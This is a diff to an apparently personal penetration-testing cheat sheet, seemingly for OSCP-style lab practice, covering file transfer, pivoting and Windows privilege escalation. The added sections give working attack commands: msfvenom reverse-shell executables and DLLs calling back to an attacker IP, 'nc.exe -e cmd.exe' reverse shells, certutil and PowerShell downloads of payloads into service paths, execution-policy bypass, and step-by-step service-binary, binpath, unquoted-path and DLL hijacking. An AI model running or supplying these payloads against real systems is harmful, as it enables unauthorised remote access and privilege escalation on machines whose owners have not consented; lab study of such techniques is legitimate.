@@ -160,7 +160,7 @@ Steps :
 8. Can't find anything ? Fuzz the directory, look for differences on response type / length could be a clue. then fuzz the sub directory again (using seclist is enough).
 9. Still can't find anything ? then its a rabbit hole.
 
-# <span style="color:rgb(11, 142, 224)">File Transfer </span>
+# <span style="color:rgb(11, 142, 224)">File Transfer & Reverse Shell </span>
 
 Start server on kali/windows : 
 you won't be able to start on 80 on victim machine if it already has something running
@@ -178,20 +178,26 @@ nc -lvnp 4444 > filename           # receiver
 ```
 
 Windows get file : 
-if you want to switch from cmd to powershell:
+
+CMD:
+1st priority : 
+```
+certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
+```
+or
+```
+powershell -Command "iwr 'http://<kali ip>:8000/reverse.exe' -OutFile 'C:\Program Files\File Permissions Service\filepermservice.exe'"
+```
+or 
 ```
 powershell iwr http://KALI_IP:8000/filename -o filename
 ```
 
 PowerShell:
+switch to PowerShell first
 ```
 iwr http://KALI_IP:8000/filename -outfile filename
 Invoke-WebRequest http://KALI_IP:8000/filename -outfile filename
-```
-CMD:
-```
-certutil -urlcache -split -f http://<kali ip>:8000/<which file to download> <downloaded file name>
-curl http://KALI_IP:8000/file -o file
 ```
 
 ##### <span style="color:rgb(11, 142, 224)">Netcat (to get shell back on kali and not use windows rdp): </span>
@@ -205,8 +211,6 @@ then copy it to current folder where python server is running
 cp /usr/share/windows-resources/binaries/nc.exe .
 ```
 then start python server and transfer
-now take a reverse shell from windows to kali
-
 to get shell back from windows to kali : 
 start a listener on Kali:
 ```
@@ -227,9 +231,7 @@ copy <input file name> \\<kali ip>\share\<output file name>
 
 # ex. copy windows.txt \\192.168.131.128\share\windows.txt
 ```
-
 If errors : 
-SMB : 
 ```
 on attacker machine : 
 impacket-smbserver -smb2support randomname . -username user -password password
@@ -241,10 +243,39 @@ dir z:
 here , "randomname" is just a random name given , and can give any username and password 
 "." here is work in the current directory
 authentication required as some servers so not accept without auth
+### <span style="color:rgb(11, 142, 224)">Reverse Shell : </span>
+
+go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
+```
+enter our kali ip and port
+start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+transfer to windows on the same `service.exe` file location
+start python server on kali : 
+```
+python3 -m http.server 8000
+```
+switch to :temp folder on windows :
+```
+cd C:\temp
+```
+download on windows :
+If you want to download directly to a path :
+```
+certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
+```
+or if you want in current directory : 
+```
+certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
+```
 
 # <span style="color:rgb(11, 142, 224)">Port Forwarding/Pivoting </span>
 
-after gaining initial access , to discover more devices on same network use nmap to scan
+after gaining initial access , to <span style="color:rgb(11, 142, 224)">discover more devices on same network</span> use nmap to scan
 download from : (on kali attacker machine)
 ```
 https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap
@@ -259,7 +290,7 @@ now check which machine you can access now
 ./nmap -p0-100 -vv <different left ips>
 ```
 
-SSH : 
+<span style="color:rgb(11, 142, 224)">SSH : </span>
 to do local port forwarding :
 ```
 ssh -L <attacker local port>:<target ip>:<target port> root@<through which ip> -i id_rsa -fN 
@@ -277,7 +308,7 @@ ssh -D 9050 -i id_rsa root@<ip to forward traffic to>
 ```
 
 
-Chisel : 
+<span style="color:rgb(11, 142, 224)">Chisel : </span>
 ```
 sudo apt install chisel     #kali linux - attacker 
 
@@ -293,7 +324,7 @@ Pivot / Win1 — connect back to Kali and create reverse forward :
 chisel.exe client <KALI_IP>:<CHISEL_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
 ```
 
-Chisel with SOCKS (for dynamic port forwarding):
+<span style="color:rgb(11, 142, 224)">Chisel with SOCKS (for dynamic port forwarding):</span>
 ```
 sudo gedit /etc/proxychains.conf
 add line in last : socks5 127.0.0.1 9050
@@ -873,11 +904,6 @@ openssl passwd -6 password123 #create a new passowrd hash ; $6$ is sha512
 If nothing works , then try Linpeas
 # <span style="color:rgb(11, 142, 224)">Windows Privilege Escalation</span>
 
-To connect to RDP : 
-```
-xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
-```
-
 Find Flag 
 do manually first : `users > desktop/documents`
 ```
@@ -887,10 +913,53 @@ where /r C:\ proof.txt
 
 like `tmp` folder in linux , windows has `tasks` folder , which is world writeable
 ```
+cd C:\temp
+or
 PS C:\Windows> cd tasks
 ```
 
-##### <span style="color:rgb(11, 142, 224)">Basic Manual enumeration : </span>
+If in powershell you are unable to execute scripts : 
+```
+powershell -executionpolicy bypass
+```
+###### <span style="color:rgb(11, 142, 224)">To connect to RDP : </span>
+```
+xfreerdp /v:<Windows_IP> /u:<USERNAME> /p:<PASSWORD> /cert:ignore /dynamic-resolution
+```
+or 
+```
+xfreerdp /v:10.48.143.132 /u:user /cert:ignore /sec:rdp /size:1280x720 /smart-sizing
+```
+Enter the password when prompted.
+
+Transfer `nc.exe` to windows and get a reverse shell : 
+First locate a copy:
+```
+find /usr/share -iname "nc.exe" 2>/dev/null
+```
+then copy it to current folder where python server is running 
+```
+cp /usr/share/windows-resources/binaries/nc.exe .
+```
+start python server : 
+```
+python3 -m http.server 8000
+```
+download on windows :
+```
+powershell iwr http://<kali ip>:8000/nc.exe -o nc.exe
+```
+to get shell back from windows to kali : 
+start a listener on Kali:
+```
+rlwrap -f . nc -lvnp 4444
+```
+windows command to get reverse shell of cmd : 
+```
+nc.exe -e cmd.exe <kali ip> 4444
+```
+
+###### <span style="color:rgb(11, 142, 224)">Basic Manual enumeration : </span>
 ###### User 
 to check current user 
 ```
@@ -998,13 +1067,307 @@ icacls <file name> /setintegritylevel m
 # you cannot set integrity level higher than that of your user
 ```
 
-##### <span style="color:rgb(11, 142, 224)">Service Abuse : </span>
+### <span style="color:rgb(11, 142, 224)">Service Abuse : </span>
 
+###### Windows Service Enumeration : 
 
+Displays services and their current states, such as `RUNNING` or `STOPPED`.
+```
+sc query
 ```
 
+Lists Windows services, the accounts running them, and their executable paths :
+```
+wmic service get name, startname, pathname
+```
+From here look for those services :
+1. don't focus on system32 or admin directories
+2. which are in program files or tmp or users directory 
+3. Look for "LocalSystem"
+4. which seems like custom services not default ones
+5. which you can modify 
+6. Which don't have quoted path (" ")
+
+to get more details about a specific service which you find interesting: 
+```
+sc qc <service name>
+```
+see start type , binary path and service start name
+we need to check if the binary path is writeable/modifiable
+###### <span style="color:rgb(11, 142, 224)">Automated Tools : </span>
+
+SharpUp :
+downlaod from : 
+https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe
+transfer to windows 
+switch to cmd
+```
+cmd
+```
+Run SharpUp
+```
+.\SharpUp.exe audit
 ```
 
+accesschk : 
+Download from :
+https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
+unzip 
+transfer `accesschk.exe` to windows 
+run :
+```
+.\accesschk.exe -cv <servicename> -accepteula
+```
+
+PowerUp (PowerShell) :
+download from :
+https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1
+transfer to windows 
+switch to power shell : 
+```
+powershell
+```
+Import PowerUp in powershell
+```
+Import-Module .\PowerUp.ps1
+```
+Run all checks
+```
+Invoke-AllChecks
+```
+
+----
+
+start python server : 
+```
+python3 -m http.server 8000
+```
+download on windows :
+```
+powershell iwr http://192.168.163.199:8000/accesschk.exe -o accesschk.exe
+```
+
+###### <span style="color:rgb(11, 142, 224)">Method 1 : Change the Service Executable in the path</span>
+
+Use SharpUp and Look for
+=== Modifiable Service Binaries ===
+
+```
+sc qc filepermsvc
+```
+Look for START_TYPE ,  BINARY_PATH , SERVICE_START_NAME(should be Localsystem)
+
+```
+icacls "C:\Program Files\File Permissions Service\filepermservice.exe"
+```
+we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
+so it means we can edit this path 
+
+and well replace the service.exe with our reverse shell
+go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
+```
+enter our kali ip and port
+start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+transfer to windows on the same `service.exe` file location
+start python server : 
+```
+python3 -m http.server 8000
+```
+download on windows directly to path :
+```
+certutil -f -urlcache http://192.168.163.199:8000/reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+```
+or 
+download normally then replace the service .exe file
+```
+copy reverse.exe
+```
+now we need to start the service
+If its "demand_start" it wont start automatically 
+Restart the service (or wait for reboot if no permissions)
+```
+net start <service_name>
+net stop <service_name>
+# sc start
+# sc stop
+```
+well get a reverse shell back 
+
+###### <span style="color:rgb(11, 142, 224)">Method 2 : Change the Service Executable path</span>
+
+Use SharpUp and Look for
+=== Modifiable Services ===
+
+```
+sc qc daclsvc
+```
+Look for START_TYPE ,  BINARY_PATH , SERVICE_START_NAME(should be Localsystem)
+
+```
+icacls "C:\Program Files\DACL Service\daclservice.exe"
+```
+we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
+so it means we can edit this path 
+
+we see we have neither of W , M , F in this 
+that means we cannot write or modify this 
+now well check if we can modify its path
+
+well use accesschk : 
+follow steps from there now
+look for `RW Everyone : SERVICE_CHANGE_CONFIG`
+this permission should be in everyone or you group in which you are in 
+that means we can modify the file path 
+
+and well replace the service.exe with our reverse shell
+go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
+```
+enter our kali ip and port
+start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+transfer to windows on the same `service.exe` file location
+start python server on kali : 
+```
+python3 -m http.server 8000
+```
+switch to :temp folder on windows :
+```
+cd C:\temp
+```
+download on windows :
+```
+certutil -f -urlcache http://192.168.163.199:8000/reverse.exe reverse.exe
+```
+change bin path 
+```
+sc config daclsvc binpath= "C:\temp\reverse.exe"
+```
+verify it again 
+```
+sc qc daclsvc
+```
+now start listener and start the service
+```
+net start daclsvc
+```
+well get the shell back
+
+###### <span style="color:rgb(11, 142, 224)">Method 3 : Unquoted Service Paths</span>
+
+Lists Windows services, the accounts running them, and their executable paths :
+```
+wmic service get name, startname, pathname
+```
+From here look for those services :
+1. Which don't have quotes (" ")
+2. which seems like custom services not default ones
+3. don't focus on system32 or admin directories
+4. which are in program files or tmp or users directory 
+5. Look for "LocalSystem"
+
+automated way : (do manual also)
+well use PowerUp (PowerShell) for that
+go to automated tools for that
+now look for `[*] Checking for unquoted service paths...`
+
+now for ex. if we get `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
+we have to check recursively from the starting of folder path till ending to see if we have write access to the folder or not
+till we get we only look for  W (Write-only access)* , M (Modify access), F (Full access) for our group
+so it means we can edit this folder contents ex. "BUILTIN\Users:(F)"
+```
+icacls C:\
+icacls "C:\Program Files"
+icacls "C:\Program Files\Unquoted Path Service"
+icacls "C:\Program Files\Unquoted Path Service\Common Files"
+```
+after the get the folder where we have writeable permissions for : 
+ex. so in this the search order will be for system as 
+```
+C:\Program.exe
+C:\Program Files\Unquoted.exe
+C:\Program Files\Unquoted Path.exe
+C:\Program Files\Unquoted Path Service\Common.exe
+C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe 
+```
+make a reverse shell with the name of "FOLDER.exe"
+transfer to windows 
+and paste in this path
+
+go to > https://www.revshells.com/ > msfvenom > Windows Stageless Reverse TCP (x64)
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.163.199 LPORT=4444 -f exe -o Common.exe
+```
+enter our kali ip and port
+start listener on kali 
+```
+rlwrap -cAr nc -lvnp 4444
+```
+transfer to windows on the same `service.exe` file location
+start python server on kali : 
+```
+python3 -m http.server 8000
+```
+download on windows :
+If you want to download directly to a path :
+```
+certutil -f -urlcache http://192.168.163.199:8000/Common.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+```
+start the service
+```
+net start unquotedsvc
+```
+well get the shell back
+###### <span style="color:rgb(11, 142, 224)">Method 4 : DLL Hijacking </span>
+
+Enumeration 1 : 
+ProcMon :
+```
+▹ Add Filter: Process Name = yourapp.exe
+▹ Add Filter: Result = NAME NOT FOUND
+```
+
+Enumeration 2 :
+Check permissions to unprivileged paths
+```
+▹ icacls <directory>
+▹ accesschk.exe -accepteula -dqv <directory>
+```
+
+Exploit :
+Create a payload 
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali ip> LPORT=4444 -f dll -o hijackme.dll
+```
+Place the DLL in the writable path
+```
+copy reverse.dll <writable_dll_path>
+```
+Restart the service (or wait for reboot if no permissions)
+```
+sc start <service_name>
+sc stop <service_name>
+```
+
+### <span style="color:rgb(11, 142, 224)">Sensitive Credentials</span>
+
+
+
+
+
+
+
+
+
+### <span style="color:rgb(11, 142, 224)">Privilege Attacks</span>
 ###### <span style="color:rgb(11, 142, 224)">to check current privileges</span>
 ```
 whoami /priv
@@ -1031,29 +1394,10 @@ https://github.com/BeichenDream/GodPotato
 ```
 download the net4 version
 execute : 
-transfer `nc.exe` to windows first
-First locate a copy:
-```
-find /usr/share -iname "nc.exe" 2>/dev/null
-```
-then copy it to current folder where python server is running 
-```
-cp /usr/share/windows-resources/binaries/nc.exe .
-```
-cmd 
-```
-curl http://KALI_IP:8000/nc.exe -o nc.exe
-```
-start a listener on Kali:
-```
-nc -lvnp 4444
-```
 Then from the Windows LOCAL SERVICE shell:
 ```
-.\GodPotato-NET4.exe -cmd "cmd /c nc.exe YOUR_KALI_VPN_IP 4444 -e cmd.exe"
+.\GodPotato-NET4.exe
 ```
-Your Kali listener should then receive a **new shell**.
-
 
 ###### If nothing works , then try Winpeas
 Download `winPEASx64.exe` : 
